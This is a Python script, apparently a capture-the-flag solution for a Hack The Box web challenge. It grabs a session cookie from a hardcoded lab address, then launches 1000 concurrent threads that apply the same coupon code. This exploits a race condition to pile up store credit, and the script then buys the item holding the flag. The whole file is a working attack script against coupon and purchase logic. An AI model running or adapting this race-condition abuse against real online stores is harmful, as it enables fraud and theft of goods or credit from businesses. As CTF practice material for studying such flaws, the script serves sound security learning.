import requests
from threading import Thread

url = "http://157.245.33.77:30345" 

data1 = {"coupon_code":"HTB_100"} # valid coupon code
data2 = {"coupon_code":"invalid"} # invalid coupon code for acquiring cookie

item1 = {"item":"B5"} 
item2 = {"item":"C8"} # Item containing flag

path1 = "/api/coupons/apply"
path2 = "/api/purchase"


# function to get cookies from the request
def getcookie():
    response = requests.post(url+path1,data=data2)
    cookie = response.cookies.get_dict()
    cookies = {'session':cookie['session']}
    return cookies

# making request to apply coupon code
def race(cookie):
    requests.post(url+path1,data=data1,cookies=cookie)


if __name__ == '__main__':
    cookies = getcookie()
    processes = []
		# Running multiple threads
    for i in range(1000):
        process = Thread(target=race,args=(cookies,)) 
        processes.append(process)
    for j in processes:
        j.start()
    for k in processes:
        k.join()


# Check the remaining credits
response1 = requests.post(url+path2,data=item1,cookies=cookies)
result1 = response1.content.decode("utf-8")
print(result1)

# If we have enough credits, then we will get the flag
response2 = requests.post(url+path2,data=item2,cookies=cookies)
result2 = response2.content.decode("utf-8")
print(result2)
